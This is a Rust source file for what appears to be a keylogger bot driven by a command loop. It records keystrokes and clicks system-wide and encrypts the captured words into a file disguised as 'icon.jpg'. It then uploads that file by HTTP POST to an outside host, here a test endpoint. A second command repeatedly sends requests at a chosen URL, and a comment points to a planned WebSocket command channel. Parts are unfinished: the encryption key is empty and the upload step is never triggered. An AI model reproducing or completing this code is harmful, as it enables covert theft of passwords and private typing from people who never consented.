#![allow(non_snake_case,non_camel_case_types,dead_code)]

use std::{fs::{self, File}, io::Write,};
use rdev::{EventType, Key, SimulateError, Button, simulate, listen};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use tokio::sync::mpsc::channel;

#[derive(Debug,Default)]
enum CMD{
    KEYLOG,
    #[default]
    SLEEP,
    C_ICON,
    R_ICON,
    SEND,
    ATT(String,u16)
}
impl From<&str> for CMD{
    fn from(s: &str) -> Self {
        match s{
            "KEYLOG"=>CMD::KEYLOG,
            "SLEEP"=>CMD::SLEEP,
            "C_ICON"=>CMD::C_ICON,
            "R_ICON"=>CMD::R_ICON,
            "SEND"=>CMD::SEND,
            "ATT"=>CMD::ATT(String::new(),0),
            _ => CMD::SLEEP
        }
    }
}
impl ToString for CMD{
    fn to_string(&self) -> String {
        match &self{
            CMD::KEYLOG=>String::from("KEYLOG"),
            CMD::SLEEP=>String::from("SLEEP"),
            CMD::C_ICON=>String::from("C_ICON"),
            CMD::R_ICON=>String::from("R_ICON"),
            CMD::SEND=>String::from("SEND"),
            CMD::ATT(_,_)=>String::from("ATT"),
        }
    }
}

#[tokio::main]
async fn main() {
    // WS connection here
    let (cmd_sender,mut cmd_receiver) =channel::<CMD>(1);
    let mut words = Box::new(Vec::<String>::new());
    cmd_sender.send(CMD::ATT(String::from("www.google.com"),5)).await.unwrap();
    let tx_sender = cmd_sender.clone();
    while let Some(cmd) = cmd_receiver.recv().await{
        println!("COMMAND {}",cmd.to_string() );
        match cmd{
            CMD::KEYLOG=>{
                let (key_sender,mut key_receiver) = tokio::sync::mpsc::unbounded_channel::<String>();
                let mut word = String::new();
                let thr_input = tokio::spawn(async move{
                    save_keyboard_input(key_sender).await.unwrap();
                });
                while let Some(data) = key_receiver.recv().await{
                    if words.len() >= 4{
                        std::mem::drop(key_receiver);
                        std::mem::drop(thr_input);
                        std::mem::drop(word);
                        break;
                    }
                    if data == "Enter"{
                        if !word.is_empty(){
                            words.push(word.clone());
                            println!("DATA => {:?}",words);
                            word.clear();
                        }
                    }else{
                        word.push_str(data.as_str());
                    }
                }
                tx_sender.send(CMD::SLEEP).await.unwrap();
            },
            CMD::SLEEP=>{
                println!("SLEEP MODE");
                std::thread::sleep(std::time::Duration::from_secs(2));
                tx_sender.send(CMD::C_ICON).await.unwrap();
            },
            CMD::C_ICON=>{
                let file = create_icon_file();
                if file.is_err(){
                    std::thread::sleep(std::time::Duration::from_secs(2));
                    set_readonly(false).unwrap();
                    fs::remove_file("./icon.jpg").unwrap();
                    tx_sender.send(CMD::C_ICON).await.unwrap();
                }
                let data = encrypt(*words.clone());
                let result = file.unwrap().write_all(&data[..]);
                if result.is_err(){
                    std::thread::sleep(std::time::Duration::from_secs(2));
                    tx_sender.send(CMD::R_ICON).await.unwrap();
                }
                words.clear();
                set_readonly(true).unwrap();
            },
            CMD::SEND=>{
                let file = fs::read("./icon.jpg").unwrap();
                let client = reqwest::Client::new();
                // test url 
                // http://httpbin.org/post
                let res = client
                    .post("http://httpbin.org/post")
                    .body(file)
                    .send()
                    .await;
                if res.is_err(){
                    std::thread::sleep(std::time::Duration::from_secs(2));
                    std::mem::drop(client);
                    tx_sender.send(CMD::SEND).await.unwrap();
                }
                set_readonly(false).unwrap();
                fs::remove_file("./icon.jpg").unwrap();

                std::thread::sleep(std::time::Duration::from_secs(1));
                tx_sender.send(CMD::SLEEP).await.unwrap();
            }
            CMD::ATT(url,times)=>{
                for _ in 0..times{
                    let client = reqwest::Client::new();
                    match client
                    .get(url.clone())
                    .send()
                    .await{
                        Ok(_)=>(),
                        Err(_)=>(),    
                    };
                }
            }
            _ =>{}
        }
    }

}


fn encrypt(text:Vec<String>)->Vec<u8>{
    let  private_key:Vec<u8> = vec![];
    let data = text.into_iter().map(|mut s|{s.push_str(" || ");s}).collect::<String>();
    let cipher = Aes256Gcm::new_from_slice(&private_key).unwrap();
    let nonce = Nonce::from_slice(b"nonce"); 

    let ciphertext = cipher.encrypt(nonce, data.as_ref()).unwrap();
    ciphertext
}

async fn save_keyboard_input(sender:tokio::sync::mpsc::UnboundedSender<String>)->Result<(),Box<dyn std::error::Error>>{
    listen(move |event|{
        match event.event_type{
            EventType::KeyRelease(c)=>{
                if c == Key::Return {
                    match sender
                    .send("Enter".to_string()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                }
            },
            EventType::KeyPress(c)=>{
                if c != Key::Return {
                    if event.name.is_some(){
                    match sender
                    .send(event.name.unwrap()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                    }
                }
            },
            EventType::ButtonRelease(c) =>{
                if c == Button::Left{
                    match sender
                    .send("Enter".to_string()){
                        Ok(_)=>(),
                        Err(_)=>return,
                    };
                }
            },
            _ =>(),
        };
    }).unwrap();
    Ok(())
}

fn send(event_type: &EventType) {
    match simulate(event_type) {
        Ok(()) => (),
        Err(SimulateError) => {
            println!("We could not send {:?}", event_type);
        }
    }
}
fn create_icon_file()->std::io::Result<File>{
    let file = fs::File::create("./icon.jpg")?;
    Ok(file)
}
fn set_readonly(input:bool)->std::io::Result<()>{
    let mut perms = fs::metadata("./icon.jpg")?.permissions();
    perms.set_readonly(input);
    fs::set_permissions("./icon.jpg", perms)?;
    Ok(())
}